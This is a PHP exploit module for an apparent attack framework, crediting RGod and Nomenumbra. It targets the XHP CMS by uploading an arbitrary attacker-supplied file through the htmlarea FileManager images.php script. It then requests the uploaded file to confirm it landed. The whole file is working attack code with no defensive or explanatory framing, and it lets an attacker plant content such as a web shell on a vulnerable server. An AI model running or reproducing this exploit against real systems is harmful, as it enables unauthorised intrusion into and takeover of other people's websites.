<?php

/*
  XHP Exploit, by RGod, modified as an ouroboros module by Nomenumbra
*/

class xhp extends Xploit {

function Sploit($host,$port,$path,$filename,$filecontent)
{

  $p='http://'.$host.':'.$port.$path;
  $data='-----------------------------7d61592213049c
Content-Disposition: form-data; name="dir"

/
-----------------------------7d61592213049c
Content-Disposition: form-data; name="upload"; filename="'.$filename.'"
Content-Type: text/plain

'.$filecontent.'
-----------------------------7d61592213049c
Content-Disposition: form-data; name="submit"

Upload
-----------------------------7d61592213049c--
';
  $packet="POST ".$p."inc/htmlarea/plugins/FileManager/images.php HTTP/1.0\r\n";
  $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61592213049c\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Content-Length: ".strlen($data)."\r\n";
  $packet.="Connection: close\r\n\r\n";
  $packet.=$data; 
  sendpacket($host,$port,$packet);
  Sleep(2);

  $packet="GET ".$p."FileManager/".$filename." HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $html = sendpacket($host,$port,$packet);
  if (strstr($html,$MAIN['signature']))
    return true;
  else
    return false;
}

}


?>
